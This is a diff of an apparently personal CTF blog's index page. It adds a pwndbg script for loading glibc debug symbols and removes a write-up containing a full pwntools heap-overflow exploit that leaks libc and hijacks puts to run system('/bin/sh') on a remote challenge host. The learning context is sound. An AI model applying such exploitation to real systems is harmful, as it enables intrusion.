@@ -75,6 +75,123 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-pwngdb解决更换libc后不加载符号-IO-FILE等结构没有符号的问题" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/04/23/pwngdb%E8%A7%A3%E5%86%B3%E6%9B%B4%E6%8D%A2libc%E5%90%8E%E4%B8%8D%E5%8A%A0%E8%BD%BD%E7%AC%A6%E5%8F%B7-IO-FILE%E7%AD%89%E7%BB%93%E6%9E%84%E6%B2%A1%E6%9C%89%E7%AC%A6%E5%8F%B7%E7%9A%84%E9%97%AE%E9%A2%98/" class="article-date">
+  <time class="dt-published" datetime="2025-04-23T04:49:17.000Z" itemprop="datePublished">2025-04-23</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2025/04/23/pwngdb%E8%A7%A3%E5%86%B3%E6%9B%B4%E6%8D%A2libc%E5%90%8E%E4%B8%8D%E5%8A%A0%E8%BD%BD%E7%AC%A6%E5%8F%B7-IO-FILE%E7%AD%89%E7%BB%93%E6%9E%84%E6%B2%A1%E6%9C%89%E7%AC%A6%E5%8F%B7%E7%9A%84%E9%97%AE%E9%A2%98/">pwngdb解决更换libc后不加载符号/_IO_FILE等结构没有符号的问题</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>之前符号都很正常 知道开始做IO_FILE题目，更换glibc版本后一直找不到_IO_FILE的符号</p>
+<p>一开始以为是glibc_all_in_one没有下载debug的glibc 然后看了一下download的输出是有的</p>
+<p>放在了.debug目录 查了好久都说pwndbg会自己加载 然后看了pwndbg说glibc没有符号</p>
+<p>终于找到了解决方案 看到了这位师傅的文章<a target="_blank" rel="noopener" href="https://www.cnblogs.com/9man/p/17741818.html">https://www.cnblogs.com/9man/p/17741818.html</a></p>
+<h1 id="脚本获取，配置"><a href="#脚本获取，配置" class="headerlink" title="脚本获取，配置"></a>脚本获取，配置</h1><p>执行<code>vim ~/.pwndbg/gdbinit.py</code><br>然后复制下方代码到最底下，然后输入<code>:wq</code>回车，保存退出。</p>
+<p>我改了一下添加的脚本</p>
+<pre><code class="hljs python"><span class="hljs-keyword">import</span> gdb
+<span class="hljs-keyword">import</span> os
+<span class="hljs-keyword">from</span> pathlib <span class="hljs-keyword">import</span> Path
+
+<span class="hljs-comment"># ANSI颜色转义码</span>
+COLOR_GREEN = <span class="hljs-string">&quot;\033[32m&quot;</span>  <span class="hljs-comment"># 绿色</span>
+COLOR_RED = <span class="hljs-string">&quot;\033[31m&quot;</span>    <span class="hljs-comment"># 红色</span>
+COLOR_RESET = <span class="hljs-string">&quot;\033[0m&quot;</span>   <span class="hljs-comment"># 重置颜色</span>
+
+<span class="hljs-comment"># 递归加载符号文件的函数</span>
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">load_symbols_recursive</span>(<span class="hljs-params">folder_path</span>):
+    <span class="hljs-comment"># 获取文件夹下的所有内容，包括子文件夹</span>
+    items = os.listdir(folder_path)
+
+    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> items:
+        item_path = os.path.join(folder_path, item)
+
+        <span class="hljs-keyword">if</span> os.path.isfile(item_path):
+            <span class="hljs-keyword">try</span>:
+                gdb.execute(<span class="hljs-string">&quot;add-symbol-file &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(item_path))
+                <span class="hljs-built_in">print</span>(COLOR_GREEN + <span class="hljs-string">&quot;[+] Loaded symbols &quot;</span> + COLOR_RESET + <span class="hljs-string">&quot;from &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(item_path))
+            <span class="hljs-keyword">except</span> gdb.error <span class="hljs-keyword">as</span> e:
+                <span class="hljs-built_in">print</span>(COLOR_RED + <span class="hljs-string">&quot;[-] Failed to load&quot;</span> + COLOR_RESET + <span class="hljs-string">&quot; symbols from &#123;&#125;: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(item_path, e))
+        <span class="hljs-keyword">elif</span> os.path.isdir(item_path):
+            load_symbols_recursive(item_path)  <span class="hljs-comment"># 递归处理子文件夹</span>
+
+<span class="hljs-comment"># 创建一个自定义的GDB命令，用于加载libc路径对应的.debug符号</span>
+<span class="hljs-keyword">class</span> <span class="hljs-title class_">LoadLibcDebugSymbols</span>(gdb.Command):
+    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
+        <span class="hljs-built_in">super</span>(LoadLibcDebugSymbols, <span class="hljs-variable language_">self</span>).__init__(<span class="hljs-string">&quot;loadlibc&quot;</span>, gdb.COMMAND_USER)
+
+    <span class="hljs-keyword">def</span> <span class="hljs-title function_">invoke</span>(<span class="hljs-params">self, arg, from_tty</span>):
+        <span class="hljs-comment"># 解析参数为libc路径</span>
+        libc_path = arg.strip()
+
+        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> libc_path:
+            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Usage: loadlibc &lt;libc_path&gt;&quot;</span>)
+            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Example: loadlibc /home/rick/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/libc.so.6&quot;</span>)
+            <span class="hljs-keyword">return</span>
+
+        <span class="hljs-comment"># 检查文件是否存在</span>
+        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(libc_path) <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> os.path.isfile(libc_path):
+            <span class="hljs-built_in">print</span>(COLOR_RED + <span class="hljs-string">&quot;[-] Libc file does not exist: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(libc_path) + COLOR_RESET)
+            <span class="hljs-keyword">return</span>
+
+        <span class="hljs-comment"># 获取.debug文件夹路径</span>
+        libc_dir = os.path.dirname(libc_path)
+        debug_dir = os.path.join(libc_dir, <span class="hljs-string">&quot;.debug&quot;</span>)
+
+        <span class="hljs-comment"># 检查.debug文件夹是否存在</span>
+        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(debug_dir) <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> os.path.isdir(debug_dir):
+            <span class="hljs-built_in">print</span>(COLOR_RED + <span class="hljs-string">&quot;[-] .debug folder does not exist in: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(libc_dir) + COLOR_RESET)
+            <span class="hljs-keyword">return</span>
+
+        <span class="hljs-comment"># 先加载libc本身的符号</span>
+        <span class="hljs-keyword">try</span>:
+            gdb.execute(<span class="hljs-string">&quot;sharedlibrary libc.so.6&quot;</span>)
+            <span class="hljs-built_in">print</span>(COLOR_GREEN + <span class="hljs-string">&quot;[+] Loaded libc.so.6 symbols&quot;</span> + COLOR_RESET)
+        <span class="hljs-keyword">except</span> gdb.error <span class="hljs-keyword">as</span> e:
+            <span class="hljs-built_in">print</span>(COLOR_RED + <span class="hljs-string">&quot;[-] Failed to load libc.so.6 symbols: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(e) + COLOR_RESET)
+
+        <span class="hljs-comment"># 然后加载.debug文件夹中的符号</span>
+        <span class="hljs-built_in">print</span>(COLOR_GREEN + <span class="hljs-string">&quot;[*] Loading debug symbols from: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(debug_dir) + COLOR_RESET)
+        load_symbols_recursive(debug_dir)
+
+LoadLibcDebugSymbols()</code></pre>
+
+<blockquote>
+<p>用法:loadlibc [libc路径]</p>
+<p>会自动查找libc路径下的.debug文件夹并且加载符号 </p>
+</blockquote>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://b.iakb.org/2025/04/23/pwngdb%E8%A7%A3%E5%86%B3%E6%9B%B4%E6%8D%A2libc%E5%90%8E%E4%B8%8D%E5%8A%A0%E8%BD%BD%E7%AC%A6%E5%8F%B7-IO-FILE%E7%AD%89%E7%BB%93%E6%9E%84%E6%B2%A1%E6%9C%89%E7%AC%A6%E5%8F%B7%E7%9A%84%E9%97%AE%E9%A2%98/" data-id="cmlrdrtk4000pckua1kve82c2" data-title="pwngdb解决更换libc后不加载符号/_IO_FILE等结构没有符号的问题" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/debug-symbol/" rel="tag">debug-symbol</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/glibc/" rel="tag">glibc</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwngdb/" rel="tag">pwngdb</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%AC%94%E8%AE%B0/" rel="tag">笔记</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%A7%A3%E5%86%B3/" rel="tag">解决</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%AE%B0%E5%BD%95/" rel="tag">记录</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E9%97%AE%E9%A2%98/" rel="tag">问题</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-SUCTF-2018-招新赛-unlink" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2025/04/21/SUCTF-2018-%E6%8B%9B%E6%96%B0%E8%B5%9B-unlink/" class="article-date">
@@ -231,7 +348,7 @@ io.interactive()</code></pre>
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://b.iakb.org/2025/04/21/SUCTF-2018-%E6%8B%9B%E6%96%B0%E8%B5%9B-unlink/" data-id="cmlh5f4fn000d2sua7lrih9xl" data-title="[SUCTF 2018 招新赛]unlink" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
+      <a data-url="http://b.iakb.org/2025/04/21/SUCTF-2018-%E6%8B%9B%E6%96%B0%E8%B5%9B-unlink/" data-id="cmlrdrtk2000bckua62mx0gai" data-title="[SUCTF 2018 招新赛]unlink" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
       
       
       
@@ -462,7 +579,7 @@ delete(<span class="hljs-number">2</span>)
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://b.iakb.org/2025/04/21/%E7%BE%8A%E5%9F%8E%E6%9D%AF-2023-%E5%86%B3%E8%B5%9B-Printf-but-not-fmtstr/" data-id="cmlh5f4g4005f2sua0sge92cy" data-title="[羊城杯 2023 决赛]Printf but not fmtstr" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
+      <a data-url="http://b.iakb.org/2025/04/21/%E7%BE%8A%E5%9F%8E%E6%9D%AF-2023-%E5%86%B3%E8%B5%9B-Printf-but-not-fmtstr/" data-id="cmlrdrtkm005qckua5zzf1yt0" data-title="[羊城杯 2023 决赛]Printf but not fmtstr" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
       
       
       
@@ -581,7 +698,7 @@ io.interactive()</code></pre>
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://b.iakb.org/2025/04/20/ORW2/" data-id="cmlh5f4fm00092sua9v4zf65l" data-title="ORW2" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
+      <a data-url="http://b.iakb.org/2025/04/20/ORW2/" data-id="cmlrdrtk00005ckuabejy7p39" data-title="ORW2" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
       
       
       
@@ -674,7 +791,7 @@ io.interactive()</code></pre>
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://b.iakb.org/2025/04/20/%E7%AE%80%E5%8D%95ORW%E5%88%9D%E6%8E%A2/" data-id="cmlh5f4fv001j2suagyd96wzz" data-title="简单ORW初探" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
+      <a data-url="http://b.iakb.org/2025/04/20/%E7%AE%80%E5%8D%95ORW%E5%88%9D%E6%8E%A2/" data-id="cmlrdrtkm005rckua4u1x273q" data-title="简单ORW初探" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
       
       
       
@@ -794,7 +911,7 @@ io.interactive()</code></pre>
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://b.iakb.org/2025/04/20/2-34-%E9%AB%98%E7%89%88%E6%9C%AClibc-safe-linking-%E5%88%9D%E4%BD%93%E9%AA%8C-%E8%A2%AB%E6%81%B6%E5%BF%83%E6%AD%BB%E4%BA%86/" data-id="cmlh5f4fk00032sua0tey3g8h" data-title="2.34 高版本libc safe-linking 初体验 (被恶心死了)" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
+      <a data-url="http://b.iakb.org/2025/04/20/2-34-%E9%AB%98%E7%89%88%E6%9C%AClibc-safe-linking-%E5%88%9D%E4%BD%93%E9%AA%8C-%E8%A2%AB%E6%81%B6%E5%BF%83%E6%AD%BB%E4%BA%86/" data-id="cmlrdrtju0000ckuahz4b3o74" data-title="2.34 高版本libc safe-linking 初体验 (被恶心死了)" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
       
       
       
@@ -889,7 +1006,7 @@ io.interactive()</code></pre>
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://b.iakb.org/2025/04/20/%E5%85%A5%E9%97%A8%E7%9A%84UAF/" data-id="cmlh5f4fu001h2sua5ppggpov" data-title="入门的UAF" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
+      <a data-url="http://b.iakb.org/2025/04/20/%E5%85%A5%E9%97%A8%E7%9A%84UAF/" data-id="cmlrdrtka001gckuaf7zhany5" data-title="入门的UAF" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
       
       
       
@@ -979,7 +1096,7 @@ new(<span class="hljs-number">11</span>,<span class="hljs-number">0x50</span>)
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://b.iakb.org/2025/04/20/tcache%E4%BA%8C%E6%AC%A1%E5%B7%A9%E5%9B%BA-malloc-hook-onegadget/" data-id="cmlh5f4fs00102suaaab79eiy" data-title="tcache二次巩固 + __malloc_hook + onegadget" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
+      <a data-url="http://b.iakb.org/2025/04/20/tcache%E4%BA%8C%E6%AC%A1%E5%B7%A9%E5%9B%BA-malloc-hook-onegadget/" data-id="cmlrdrtk6000zckuabael13zz" data-title="tcache二次巩固 + __malloc_hook + onegadget" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
       
       
       
@@ -1084,7 +1201,7 @@ p.interactive()</code></pre>
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://b.iakb.org/2025/04/20/%E5%85%B7%E6%9C%89key%E7%9A%84%E9%AB%98%E7%89%88%E6%9C%ACtcache-attack%E5%88%9D%E4%BD%93%E9%AA%8C/" data-id="cmlh5f4fu001i2sua10m19xo8" data-title="具有key的高版本tcache attack初体验" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
+      <a data-url="http://b.iakb.org/2025/04/20/%E5%85%B7%E6%9C%89key%E7%9A%84%E9%AB%98%E7%89%88%E6%9C%ACtcache-attack%E5%88%9D%E4%BD%93%E9%AA%8C/" data-id="cmlrdrtka001kckua3owaaxl3" data-title="具有key的高版本tcache attack初体验" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
       
       
       
@@ -1194,106 +1311,11 @@ p.interactive()</code></pre>
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://b.iakb.org/2025/04/20/ret2csu-%E7%AC%AC%E4%B8%80%E6%AC%A1%E8%A7%A3%E7%AD%94/" data-id="cmlh5f4fr000v2sua1bl0a2gz" data-title="ret2csu 第一次解答" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
+      <a data-url="http://b.iakb.org/2025/04/20/ret2csu-%E7%AC%AC%E4%B8%80%E6%AC%A1%E8%A7%A3%E7%AD%94/" data-id="cmlrdrtk6000xckua9xuud7bm" data-title="ret2csu 第一次解答" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
       
       
       
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/glibc/" rel="tag">glibc</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ret2csu/" rel="tag">ret2csu</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/stack/" rel="tag">stack</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-简单的堆溢出" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/04/20/%E7%AE%80%E5%8D%95%E7%9A%84%E5%A0%86%E6%BA%A2%E5%87%BA/" class="article-date">
-  <time class="dt-published" datetime="2025-04-20T08:58:01.000Z" itemprop="datePublished">2025-04-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2025/04/20/%E7%AE%80%E5%8D%95%E7%9A%84%E5%A0%86%E6%BA%A2%E5%87%BA/">简单的堆溢出</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <blockquote>
-<p>Problem: <a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/3104">[HNCTF 2022 WEEK4]ezheap</a></p>
-</blockquote>
-<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>可以进行任意长度溢出<br>溢出拿到chunk1的值,然后继续溢出拿libc_base system 随后恢复堆成之前的样子同时修改名字为bin&#x2F;sh 然后puts函数修改成system 这样当show的时候就会直接变成system(“&#x2F;bin&#x2F;sh”)</p>
-<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="hljs python">  <span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
-context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span>
-p = remote(<span class="hljs-string">&quot;node5.anna.nssctf.cn&quot;</span>,<span class="hljs-number">27862</span>)
-<span class="hljs-comment">#p = process(&quot;./ezheap&quot;)</span>
-e = ELF(<span class="hljs-string">&#x27;./ezheap&#x27;</span>)
-libc = ELF(<span class="hljs-string">&#x27;/home/rick/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)
-
-<span class="hljs-keyword">def</span> <span class="hljs-title function_">new</span>(<span class="hljs-params">idx,size,name,content</span>):
-    p.sendafter(<span class="hljs-string">b&#x27;Choice: \n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))
-    p.sendafter(<span class="hljs-string">b&#x27;Input your idx:\n&#x27;</span>,<span class="hljs-built_in">str</span>(idx))
-    p.sendafter(<span class="hljs-string">b&#x27;Size:\n&#x27;</span>,<span class="hljs-built_in">str</span>(size))
-    p.sendafter(<span class="hljs-string">b&#x27;Name: \n&#x27;</span>,name)
-    p.sendafter(<span class="hljs-string">b&#x27;Content:\n&#x27;</span>,content)
-
-<span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):
-    p.sendafter(<span class="hljs-string">b&#x27;Choice: \n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))
-    p.sendafter(<span class="hljs-string">b&#x27;Input your idx:\n&#x27;</span>,<span class="hljs-built_in">str</span>(idx))
-
-<span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):
-    p.sendafter(<span class="hljs-string">b&#x27;Choice: \n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))
-    p.sendafter(<span class="hljs-string">b&#x27;Input your idx:\n&#x27;</span>,<span class="hljs-built_in">str</span>(idx))
-
-
-<span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,size,content</span>):
-    p.sendafter(<span class="hljs-string">b&#x27;Choice: \n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">4</span>))
-    p.sendafter(<span class="hljs-string">b&#x27;Input your idx:\n&#x27;</span>,<span class="hljs-built_in">str</span>(idx))
-    p.sendafter(<span class="hljs-string">b&#x27;Size:\n&#x27;</span>,<span class="hljs-built_in">str</span>(size))
-    p.send(content)
-
-new(<span class="hljs-number">0</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;qwq&#x27;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>)
-new(<span class="hljs-number">1</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;qwq&#x27;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>) <span class="hljs-comment">#0x30+0x30</span>
-edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x30</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>)
-
-show(<span class="hljs-number">0</span>)
-p.recvuntil(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>)
-chunk_idx_1 = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))
-log.success(<span class="hljs-string">&quot;leak chunk_idx_1 =&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(chunk_idx_1))
-edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x50</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x50</span>)
-show(<span class="hljs-number">0</span>)
-p.recvuntil(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x50</span>)
-puts_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))
-log.success(<span class="hljs-string">&quot;leak puts_addr =&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(puts_addr)) 
-libc_base = puts_addr - libc.sym[<span class="hljs-string">&quot;puts&quot;</span>]
-log.success(<span class="hljs-string">&quot;leak libc_base =&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(libc_base))
-system_addr = libc_base + libc.sym[<span class="hljs-string">&quot;system&quot;</span>]
-payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span> + p64(<span class="hljs-number">0</span>) +p64(<span class="hljs-number">0x31</span>) +<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="hljs-number">0</span>)+p64(chunk_idx_1)+p64(<span class="hljs-number">0x1</span>)+p64(system_addr)
-edit(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(payload),payload)
-show(<span class="hljs-number">1</span>)
-<span class="hljs-comment">#attach(p)</span></code></pre>
-
-<p>p.interactive()</p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2>
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://b.iakb.org/2025/04/20/%E7%AE%80%E5%8D%95%E7%9A%84%E5%A0%86%E6%BA%A2%E5%87%BA/" data-id="cmlh5f4g4005e2suah5izh8vj" data-title="简单的堆溢出" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/heap/" rel="tag">heap</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/off-by-one/" rel="tag">off-by-one</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
 
     </footer>
   </div>
@@ -1321,7 +1343,7 @@ show(<span class="hljs-number">1</span>)
   <div class="widget-wrap">
     <h3 class="widget-title">Tags</h3>
     <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/0day/" rel="tag">0day</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/2025/" rel="tag">2025</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/BOCCHI-THE-ROCK/" rel="tag">BOCCHI THE ROCK</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IO-file/" rel="tag">IO_file</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RPC/" rel="tag">RPC</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/UEFI/" rel="tag">UEFI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Windows/" rel="tag">Windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IO-FILE/" rel="tag">_IO_FILE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IO-FILEt/" rel="tag">_IO_FILEt</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/malloc-hook/" rel="tag">_malloc_hook</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/debug-symbol/" rel="tag">debug-symbol</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dirsearch/" rel="tag">dirsearch</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fastbin/" rel="tag">fastbin</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/git-leak/" rel="tag">git leak</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/glibc/" rel="tag">glibc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/header/" rel="tag">header</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/heap/" rel="tag">heap</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/heap-feng-shui/" rel="tag">heap_feng_shui</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hook/" rel="tag">hook</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/house-of-apple2/" rel="tag">house of apple2</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/house-of-orange/" rel="tag">house of orange</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/inline-hook/" rel="tag">inline hook</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/" rel="tag">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/match/" rel="tag">match</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/off-by-one/" rel="tag">off-by-one</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/one-gadget/" rel="tag">one_gadget</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/orw/" rel="tag">orw</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwngdb/" rel="tag">pwngdb</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/rce/" rel="tag">rce</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ret2csu/" rel="tag">ret2csu</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ret2shellcode/" rel="tag">ret2shellcode</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ret2text/" rel="tag">ret2text</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/root/" rel="tag">root</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/safe-linking/" rel="tag">safe-linking</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shellcode/" rel="tag">shellcode</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/stack/" rel="tag">stack</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/stdout/" rel="tag">stdout</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tcache/" rel="tag">tcache</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/uaf/" rel="tag">uaf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/unauthorized/" rel="tag">unauthorized</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/unlink/" rel="tag">unlink</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/unserialize/" rel="tag">unserialize</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/virtual-memory/" rel="tag">virtual memory</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/vmware/" rel="tag">vmware</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows/" rel="tag">windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%B8%96%E7%95%8C%E6%9D%AF/" rel="tag">世界杯</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2/" rel="tag">数据泄露</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%97%A5%E5%B8%B8/" rel="tag">日常</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AC%94%E8%AE%B0/" rel="tag">笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%A7%A3%E5%86%B3/" rel="tag">解决</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%B0%E5%BD%95/" rel="tag">记录</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%97%AE%E9%A2%98/" 